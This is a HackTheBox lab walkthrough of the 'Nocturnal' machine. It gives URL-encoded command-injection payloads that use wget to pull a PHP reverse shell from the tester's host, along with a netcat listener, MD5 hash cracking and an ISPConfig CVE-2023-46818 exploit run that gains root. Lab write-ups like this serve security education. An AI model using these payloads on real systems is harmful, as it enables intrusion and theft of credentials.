---
title: "ch3ckm8 HTB Nocturnal"
has_toc: true
---

* TOC
{:toc}

# Intro

This is an "easy" linux machine from HackTheBox, lets dive in. 
![Pasted image 20250527225024](MediaFiles/Pasted%20image%2020250527225024.png)

No Machine Information/description was provided.
Tags: #linux #commandinjection #codereview #PortForwarding
Tools used:
ffuf (webapp's users enumeration)
BurpSuite (web requests modification)
Hashcat (hash cracking)
wget (file transfers)

-------
# Reconnaissance

add machine to hosts
```shell
echo '10.10.11.64 nocturnal.htb' | sudo tee -a /etc/hosts
```

lets start our nmap scan:  
```shell
nmap nocturnal.htb -sV -Pn -T4
```
output:
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 16:38 EDT
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
```

What we see here is pretty straightforward, only 2 ports open, one for the ssh service, and one for the http

Since we have no info yet about any user, we will start with the http service.

#### Directory and subdomain enumeration

Lets do a directory enumeration using gobuster, to find as much information as possible about the web service.
```shell
gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u nocturnal.htb
```
output:
```shell
─# gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u nocturnal.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nocturnal.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://nocturnal.htb/index.php            (Status: 200) [Size: 1524]
http://nocturnal.htb/login.php            (Status: 200) [Size: 644]
http://nocturnal.htb/register.php         (Status: 200) [Size: 649]
http://nocturnal.htb/view.php             (Status: 302) [Size: 2919] [--> login.php]
http://nocturnal.htb/uploads              (Status: 403) [Size: 162]
http://nocturnal.htb/uploads.txt          (Status: 403) [Size: 162]
http://nocturnal.htb/uploads.html         (Status: 403) [Size: 162]
http://nocturnal.htb/admin.php            (Status: 302) [Size: 0] [--> login.php]
http://nocturnal.htb/logout.php           (Status: 302) [Size: 0] [--> login.php]
http://nocturnal.htb/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
http://nocturnal.htb/backups              (Status: 301) [Size: 178] [--> http://nocturnal.htb/backups/]
http://nocturnal.htb/uploads2.html        (Status: 403) [Size: 162]
http://nocturnal.htb/uploads2             (Status: 403) [Size: 162]
http://nocturnal.htb/uploads2.txt         (Status: 403) [Size: 162]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
perfect, it appears that there are not much pages to explore.

Now we can search also for subdomains too:
```shell
gobuster dns -d nocturnal.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
output
```shell
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     nocturnal.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
so no subdomains were found, lets move on

Browsing to the web app, we landed on this homepage:
![Pasted image 20250529003539](MediaFiles/Pasted%20image%2020250529003539.png)

First, lets register a new user (ch3ckm8) and then login.

On both login and register pages i tried performing `sql injection` but was not successful, so i moved on.

Then i uploaded a new file (be aware of the valid file extensions)
![Pasted image 20250529004248](MediaFiles/Pasted%20image%2020250529004248.png)
which can be seen there, lets try downloading it.

If we hover over the file , in this case the file i uploaded `accounts.xlsx`, shows the download link in the bottom of the page:
![Pasted image 20250529004507](MediaFiles/Pasted%20image%2020250529004507.png)
The url looks like this:
```shell
http://nocturnal.htb/view.php?username=ch3ckm8&file=accounts.xlsx
```

This is an interesting observation and could be a way to enumerate the users of this website.

# Foothold

##### User enumeration

For the fuzzing, we need 3 things:
- target url containing parameter for the usernames
- our current phpsessionid (cookie)
-  wordlist for usernames

0. From earlier, we have the target url:
`http://nocturnal.htb/view.php?username=ch3ckm8&file=accounts.xlsx`

1. Use burp to grab your phpsessid, in order to perform user enumeration (via interception of the request)
![Pasted image 20250529003653](MediaFiles/Pasted%20image%2020250529003653.png)

2. For the wordlist, i used this one from SecLists:
https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt
and used `FUZZ` keyword on the ffuf command to enumerate users, on the file i specified a random filename and the filename wont matter for the fuzzing process:

```shell
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=sth.xlsx' -w /root/Downloads/names.txt -H 'Cookie: PHPSESSID=ucd01moit7qaem6bddb8bm1a8n' -fs 2985
```

output

```shell
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=accounts.xlsx
 :: Wordlist         : FUZZ: /root/Downloads/names.txt
 :: Header           : Cookie: PHPSESSID=ucd01moit7qaem6bddb8bm1a8n
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 47ms]
amanda               [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 51ms]
tobias               [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 50ms]
:: Progress: [10177/10177] :: Job [1/1] :: 851 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

great! it found 3 users!:
```
admin
amanda
tobias
```

Perfect! since we know have all the available users.

Since the dashboard.php's request does not require the pass of the user, we can just use burp for every user to reach their dashboard page, and view their uploaded files.

So, try to click your uploaded file as the user you created (ch3ckm8), and interecept the request with burp, in order to modify it and then forwarding the request.

Disclaimer: the file in the request can be anything, even a non existing filename in the request wont stop the page from showing all the uploaded files of a user.
![Pasted image 20250529010842](MediaFiles/Pasted%20image%2020250529010842.png)
to each of the users we have, lets start with tobias:
![Pasted image 20250529010942](MediaFiles/Pasted%20image%2020250529010942.png)
Hm, no luck with tobias, i tried admin too and no files uploaded for this user.....

now lets try user amanda similarly, 
![Pasted image 20250529011708](MediaFiles/Pasted%20image%2020250529011708.png)

it appears there she has a file uploaded!
![Pasted image 20250529011205](MediaFiles/Pasted%20image%2020250529011205.png)

Lets first download the `.odt` file and view its contents:
```
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```

inside this text, we found plaintext pass for user amanda, the updated creds now are:
```
amanda
arHkG7HAI68X8s1J
```

We can now proceed on logging in as amanda, then we see sth interesting here:
![Pasted image 20250527174944](MediaFiles/Pasted%20image%2020250527174944.png)

it seems that amanda has access to the admin panel, and thats convenient, since we cant access the admin panel as admin.

We can go to the admin panel by clicking on the admin panel button on the same page, we come accross this page :

`admin.php`
![Pasted image 20250527175300](MediaFiles/Pasted%20image%2020250527175300.png)
i had some interesting observations here, first there are both php files, and folders (backups, uploads), and secondly we can enter input via text (backup password) to create a backup.

Then lets enter a password of our preference, create a backup, download it, to view some of the files:
![Pasted image 20250529013824](MediaFiles/Pasted%20image%2020250529013824.png)
so, upon reading the files above, i noticed the following about the files and folders:
- uploads -> contains the uploaded files 
- logout.php -> just logs out the user, nothing further valuable
- style.css -> the style of the page, no comments or anything else observed
- index.php -> the homepage, nothing further interesting
- register.php

```shell
<?php
session_start();
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = md5($_POST['password']);

    $stmt = $db->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $stmt->bindValue(':password', $password, SQLITE3_TEXT);

    if ($stmt->execute()) {
        $_SESSION['success'] = 'User registered successfully!';
        header('Location: login.php');
        exit();
    } else {
        $error = 'Failed to register user.';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Register</h1>
        <?php if (isset($error)): ?>
            <p class="error"><?php echo $error; ?></p>
        <?php endif; ?>
        <form method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Register</button>
        </form>
        <a href="login.php">Already have an account? Login here</a>
    </div>
</body>
</html>
```

- login.php

```shell
<?php
session_start();
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $stmt = $db->prepare("SELECT * FROM users WHERE username = :username");
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $result = $stmt->execute()->fetchArray();

    if ($result && md5($password) === $result['password']) {
        $_SESSION['user_id'] = $result['id'];
        $_SESSION['username'] = $username;
        header('Location: dashboard.php');
        exit();
    } else {
        $error = 'Invalid username or password.';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <?php if (isset($error)): ?>
            <p class="error"><?php echo $error; ?></p>
        <?php endif; ?>
        <form method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <a href="register.php">Don't have an account? Register here</a>
    </div>
</body>
</html>
```

- dashboard.php 
![Pasted image 20250529004248](MediaFiles/Pasted%20image%2020250529004248.png)

```shell
<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}

$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
$user_id = $_SESSION['user_id'];
$username = $_SESSION['username'];

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $target_dir = "uploads/";
    $file_name = basename($_FILES["fileToUpload"]["name"]);
    $target_file = $target_dir . $file_name;
    $file_type = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    $allowed_types = array("pdf", "doc", "docx", "xls", "xlsx", "odt");

    if (in_array($file_type, $allowed_types)) {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            $stmt = $db->prepare("INSERT INTO uploads (user_id, file_name) VALUES (:user_id, :file_name)");
            $stmt->bindValue(':user_id', $user_id, SQLITE3_INTEGER);
            $stmt->bindValue(':file_name', $file_name, SQLITE3_TEXT);
            $stmt->execute();
        } else {
            echo "Error uploading file.";
        }
    } else {
        echo "Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.";
    }
}

// Get user's uploaded files
$stmt = $db->prepare("SELECT * FROM uploads WHERE user_id = :user_id");
$stmt->bindValue(':user_id', $user_id, SQLITE3_INTEGER);
$files = $stmt->execute();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <?php if ($username === 'admin' || $username === 'amanda'): ?>
            <p><a href="/admin.php">Go to Admin Panel</a></p>
        <?php endif; ?>
         <h1>Welcome, <?php echo htmlspecialchars($username); ?></h1>

        <h2>Upload File</h2>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" required>
            <button type="submit">Upload File</button>
        </form>

        <h2>Your Files</h2>
        <ul>
            <?php while ($row = $files->fetchArray()): ?>
                <li>
                    <a href="view.php?username=<?php echo urlencode($username); ?>&file=<?php echo urlencode($row['file_name']); ?>">
                        <?php echo htmlspecialchars($row['file_name']); ?>
                    </a>
                    <span>(Uploaded on <?php echo $row['upload_time']; ?>)</span>
                </li>
            <?php endwhile; ?>
        </ul>

        <a href="logout.php" class="logout">Logout</a>
    </div>
</body>
</html>
```

- view.php -> when you download the file

```shell
<?php ob_start(); ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View File</title>
</head>
<body>

<div class="container">
    <h1>File Viewer</h1>

    <?php
    session_start();

    if (!isset($_SESSION['user_id'])) {
        header('Location: login.php');
        exit();
    }

    $db = new SQLite3('../nocturnal_database/nocturnal_database.db');

    $username = $_GET['username'];
    $file = basename($_GET['file']);

    $allowed_extensions = ["pdf", "doc", "docx", "xls", "xlsx", "odt"];
    $file_extension = pathinfo($file, PATHINFO_EXTENSION);

    if (!in_array($file_extension, $allowed_extensions)) {
        echo "<div class='error'>Invalid file extension.</div>";
        exit();
    }

    $stmt = $db->prepare('SELECT id FROM users WHERE username = :username');
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $result = $stmt->execute();

    if ($row = $result->fetchArray()) {
        $user_id = $row['id'];

        $stmt = $db->prepare('SELECT * FROM uploads WHERE user_id = :user_id AND file_name = :file');
        $stmt->bindValue(':user_id', $user_id, SQLITE3_INTEGER);
        $stmt->bindValue(':file', $file, SQLITE3_TEXT);
        $result = $stmt->execute();

        if ($row = $result->fetchArray()) {
            $file_path = 'uploads/' . $file;

            if (file_exists($file_path)) {
                ob_clean();
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
                readfile($file_path);
                exit();
            } else {
                echo "<div class='error'>File not found on the server.</div>";
                showAvailableFiles($user_id, $db);
            }
        } else {
            echo "<div class='error'>File does not exist.</div>";
            showAvailableFiles($user_id, $db);
        }
    } else {
        echo "<div class='error'>User not found.</div>";
    }

    function showAvailableFiles($user_id, $db) {
        $stmt = $db->prepare('SELECT file_name FROM uploads WHERE user_id = :user_id');
        $stmt->bindValue(':user_id', $user_id, SQLITE3_INTEGER);
        $result = $stmt->execute();

        echo "<h2>Available files for download:</h2>";
        echo "<ul>";

        while ($row = $result->fetchArray()) {
            $file_name = $row['file_name'];
            echo '<li><a href="view.php?username=' . urlencode($_GET['username']) . '&file=' . urlencode($file_name) . '">' . htmlspecialchars($file_name) . '</a></li>';
        }

        echo "</ul>";
    }
    ?>

</div>

</body>
</html>
```

- admin.php
This page will be our target, as wee see a text box there, indicating that we can specify password to encrypt our backup, lets inspect its code too, to see if we can find how it works under the hood:
![Pasted image 20250527175300](MediaFiles/Pasted%20image%2020250527175300.png)

```shell
<?php
session_start();

if (!isset($_SESSION['user_id']) || ($_SESSION['username'] !== 'admin' && $_SESSION['username'] !== 'amanda')) {
    header('Location: login.php');
    exit();
}

function sanitizeFilePath($filePath) {
    return basename($filePath); // Only gets the base name of the file
}

// List only PHP files in a directory
function listPhpFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    echo "<ul class='file-list'>";
    foreach ($files as $file) {
        $sanitizedFile = sanitizeFilePath($file);
        if (is_dir($dir . '/' . $sanitizedFile)) {
            // Recursively call to list files inside directories
            echo "<li class='folder'>📁 <strong>" . htmlspecialchars($sanitizedFile) . "</strong>";
            echo "<ul>";
            listPhpFiles($dir . '/' . $sanitizedFile);
            echo "</ul></li>";
        } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {
            // Show only PHP files
            echo "<li class='file'>📄 <a href='admin.php?view=" . urlencode($sanitizedFile) . "'>" . htmlspecialchars($sanitizedFile) . "</a></li>";
        }
    }
    echo "</ul>";
}

// View the content of the PHP file if the 'view' option is passed
if (isset($_GET['view'])) {
    $file = sanitizeFilePath($_GET['view']);
    $filePath = __DIR__ . '/' . $file;
    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {
        $content = htmlspecialchars(file_get_contents($filePath));
    } else {
        $content = "File not found or invalid path.";
    }
}

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

</head>
<body>
    <div class="container">
        <h1>Admin Panel</h1>

        <h2>File Structure (PHP Files Only)</h2>
        <?php listPhpFiles(__DIR__); ?>

        <h2>View File Content</h2>
        <?php if (isset($content)) { ?>
            <pre><?php echo $content; ?></pre>
        <?php } ?>

        <h2>Create Backup</h2>
        <form method="POST">
            <label for="password">Enter Password to Protect Backup:</label>
            <input type="password" name="password" required placeholder="Enter backup password">
            <button type="submit" name="backup">Create Backup</button>
        </form>

        <div class="backup-output">

<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>

	</div>
        
        <?php if (isset($backupMessage)) { ?>
            <div class="message"><?php echo $backupMessage; ?></div>
        <?php } ?>
    </div>
</body>
</html>
```
Whats interesting here, is the part where our input is parsed:

```shell
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```
######  Why it works:
- it concatenates user input (`$password`) into a shell command without proper escaping or sanitization.
- Their is an attempt to filter certain characters (`;`, `&`, `|`, etc.) in `cleanEntry()`, but this blacklist approach is **incomplete** and **can be bypassed** using URL encoding, null bytes, tabs, newlines, or command substitution.
###### Why also `cleanEntry()` is not enough:

```shell
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```
- This function only checks for a **limited set of characters** using `strpos()`, which:
    - Does not catch characters like tabs (`\t`), newlines (`\n`), or URL-encoded input.
    - Can be bypassed with payloads that do not use the exact characters in your blacklist.
Bottom line Blacklisting is never a reliable way to sanitize shell arguments.

#### Command injection: testing

by trial and error, i concluded in this command injection type using url encoding:
`%09` -> tab (because %20 for space did not work)
`%OA` -> newline

below some examples of command injection being possible:
```shell
%0Abash%09-c%09"whoami"%0A
```
![Pasted image 20250527204845](MediaFiles/Pasted%20image%2020250527204845.png)
```shell
%0Abash%09-c%09"dir"%0A
```
![Pasted image 20250527204916](MediaFiles/Pasted%20image%2020250527204916.png)

So we know command injection EXISTS, lets now find a php rev shell in order to upload it, i found this one: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
and specified my ip and port for the rev shell. (no other changes needed on this rev shell)

BUT For some reason, pasting my input directly on the "enter password" form,
![Pasted image 20250527202640](MediaFiles/Pasted%20image%2020250527202640.png)
only executed one-word command injections like  the ones above and did not execute any more complex ones no matter which url encoding i used. 

So i thought that maybe sth wrong is going on, and i wanted to see the requests and responses in detail. thus i tried using BurpSuite.

#### Command injection: rev shell: upload

first, i input a random string, for example `sth`
![Pasted image 20250527203116](MediaFiles/Pasted%20image%2020250527203116.png)
then in burp, go to Proxy>Intercept>Intercept is on

Once you see intercept is on
![Pasted image 20250527203217](MediaFiles/Pasted%20image%2020250527203217.png)
only then click on create backup, in order to capture the request
![Pasted image 20250527203245](MediaFiles/Pasted%20image%2020250527203245.png)

now we successfully captured the request, on the right side you should see the page loading infinetely (because we are intercepting the request)
![Pasted image 20250527203356](MediaFiles/Pasted%20image%2020250527203356.png)
you can see our input `sth` on the left side, on the password variable.

After trial and error, and lots of searching, i concluded to this payload, so paste it in the password field  instead of `sth`:
```shell
%0Abash%09-c%09"wget%0910.10.14.184:8000/rev_shell.php"%0A
```
and now our new request should look like this
![Pasted image 20250527193603](MediaFiles/Pasted%20image%2020250527193603.png)

once we do that, lets go to our machine to setup our python server in order to transfer our php rev shell from our machine towards the target
```shell
python3 -m http.server 8080
```

only then hit forward in order to forward our request
![Pasted image 20250527203744](MediaFiles/Pasted%20image%2020250527203744.png)
and then you should see on your terminal, that the file has been successfully transfered:
![Pasted image 20250527203910](MediaFiles/Pasted%20image%2020250527203910.png)

perfect! now the rev shell is in! 

#### Command injection: rev shell: execution

Lets similarly now try executing it remotely, in order to get a rev shell back:

Follow the same procedure to intercept the initial request on the password field (just like we did earlier with the wget injection) but this time, modify the request on the password field, in such way that we are actually executing our php file:
```shell
%0Abash%09-c%09"php%09rev_shell.php"%0A
```
and now our new request should look like this
![Pasted image 20250527193737](MediaFiles/Pasted%20image%2020250527193737.png)

then start our listener on the port we specified in our php shell:
```shell
nc -lvnp 9001 
```

next by forwarding the request, we receive our rev shell!
![Pasted image 20250527193809](MediaFiles/Pasted%20image%2020250527193809.png)

stabilize shell:
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

once inside, i searched for valuable files and folders
![Pasted image 20250527193958](MediaFiles/Pasted%20image%2020250527193958.png)
and found a folder that seems to be related to a database
![Pasted image 20250527194105](MediaFiles/Pasted%20image%2020250527194105.png)
but we cant view it here, lets download the file locally:

on the machines current directory:
```shell
python3 -m http.server 8000
```
on our machine
```shell
wget 10.10.11.64:8000/nocturnal_database.db
```
![Pasted image 20250527194533](MediaFiles/Pasted%20image%2020250527194533.png)
nice, we got the .db file locally, lets mess with it 

Found that the database has 2 tables
```
uploads
users
```

and by viewing the table users via sqlite, i found pairs of users and hashes.
`SELECT * FROM users;`
```shell
--------------------------------
admin
d725aeba143f575736b07e045d8ceebb
--------------------------------
amanda
df8b20aa0c935023f99ea58358fb63c4
--------------------------------
tobias
55c82b1ccd55ab219b3b109b07d5061d
--------------------------------
kavi
f38cde1654b39fea2bd4f72f1ae4cdda
--------------------------------
e0Al5
101ad4543a96a7fd84908fd0d802e7db
--------------------------------
```
By validating with hash identifier, it appears that these hashes are most possibly MD5.

Next, put the hashes each one separately on a txt, and then run hashcat for each one to crack them.

Tried all of them, and only tobias's hash returned a pass from hashcat
```shell
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
output:
![Pasted image 20250527195022](MediaFiles/Pasted%20image%2020250527195022.png)
so we got the pass of user Tobias
```
Tobias
slowmotionapocalypse
```
and we are now in! lets grab the user flag!
```shell
d7cf10aa5810a5d746549a70d2b45c32
```

# Privesc

we can now try to escalating privileges
```shell
sudo -l
```
does not appear to allow us to run sudo
![Pasted image 20250527195628](MediaFiles/Pasted%20image%2020250527195628.png)

lets now inspect the processes:
```shell
ps -aux
```
nothing too obvious found here, lets move on

Lets observe the **active network connections and listening ports**
```shell
netstat -tuln
```
output:
```shell
tobias@nocturnal:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 ::1:9090                :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*    
```

hmm, it appears that sth is running on port 8080, this could be some webservice running
lets do some port forwarding to our machine, so we can (potentially) exploit it LOCALY.

we could do this while we had shell on the host, as tobias, but we dont know if running exploits with python for example would run, so its easier and a best practice to port forward and try locally.

##### Port forwarding

in our machine, port forward the machines port to our machine
```shell
ssh -L 9000:127.0.0.1:8080 tobias@nocturnal.htb
```

now on your local machine's browser, go to
```shell
http://localhost:9000/login/
```
we come accross this page
![Pasted image 20250527200514](MediaFiles/Pasted%20image%2020250527200514.png)
here i tried admin user and admin pass, but no luck

Trying with admin and tobias's password (password reuse)
```
admin
slowmotionapocalypse
```
got me in:
![Pasted image 20250527201425](MediaFiles/Pasted%20image%2020250527201425.png)

But how to move forward?
By searching all those tabs, i found empty pages and forms, and nothing seemed straightforward by inspecting them.

By inspecting the source code of the admin home page though, i found sth like a version `version 3.2.2`
```html
 <link rel='stylesheet' href='themes/default/assets/stylesheets/ispconfig.css?ver=3.2.2' />
```

also the login page's source code shows this version `version 3.2`
```html
<link rel='stylesheet' href='../themes/default/assets/stylesheets/ispconfig.css?ver=3.2' />
```

Furthermore, the monitor page shows another version `version 3.2.1'
![Pasted image 20250527202256](MediaFiles/Pasted%20image%2020250527202256.png)

Next by searching ipsconfig vulnerabilities, i found this one `CVE-2023-46818`
which appears to affect ISPConfig <= 3.2.11
![Pasted image 20250527202354](MediaFiles/Pasted%20image%2020250527202354.png)

and by using this script that exploits this vulnerability: 
https://github.com/ajdumanhug/CVE-2023-46818
```shell
python3 CVE-2023-46818.py http://localhost:8080 admin slowmotionapocalypse
```
i grabbed the root flag!
```shell
└─# python3 CVE-2023-46818.py http://localhost:9000 admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_1d8e96087d21652cb7f32dc9
[+] CSRF Key: b7739948106f89f5e7d331be30036758eaab5be0
[+] Injecting shell payload...
[+] Shell written to: http://localhost:9000/admin/sh.php
[+] Launching shell...

ispconfig-shell# whoami
root

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)

ispconfig-shell# pwd
/usr/local/ispconfig/interface/web/admin

ispconfig-shell# cd


ispconfig-shell# pwd
/usr/local/ispconfig/interface/web/admin

ispconfig-shell# cd /root


ispconfig-shell# pwd
/usr/local/ispconfig/interface/web/admin

ispconfig-shell# cat /root/root.txt
22a9d497840af1d5d56c75417e97fefb

```
![Pasted image 20250527201148](MediaFiles/Pasted%20image%2020250527201148.png)
pwned!

---
# Summary

Here is the list of the steps simplified, per phase, for future reference and for quick reading: 

#### Reconnaissance
1. nmap scan -> chose **http** service to focus on
2. **enumerate** directories & subdomains
3. browsed the website **searching for user input**, registered, logged in, uploaded & downloaded file
4. tried to understand how it works, found a **url** on the download file request that specified username **without further authentication**

#### Foothold
1. ==user enumeration==, based on the found url
2. found users, and with those inside the url i **searched for uploaded files** (since the download (view.php) page did not need the user's password in order to show their uploaded files)
3. one of the users (amanda) had uploaded a file containing their **plaintext pass**.
4. **logged in on the webapp again as this user** (amanda), which also had access to the ==admin panel==
5. on the admin panel, there is a textbox and i suspected of ==command injection==, which later was verified to exist, and was also verified via the source code of the page (to which i had access since i could download it, as user amanda has access to admin panel, that allows us to download all the webapp's source code)
6. used **command injection** to ==upload== a php rev shell
7. used **command injection** to ==execute== the uploaded php rev shell
8. once i got the rev shell, as www-data, i **searched for valuable files** and came accross a ==database file==that contained MD5 hashes for multiple users.
9. ==hash cracking== provided a password for one of them (tobias) to which i successfully logged on later via ssh and grabbed the ==user flag==.

#### Privesc
1. **tried** first `sudo -l` but the user was not allowed to run sudo
2. after searching files and directories i did not find anything interesting.
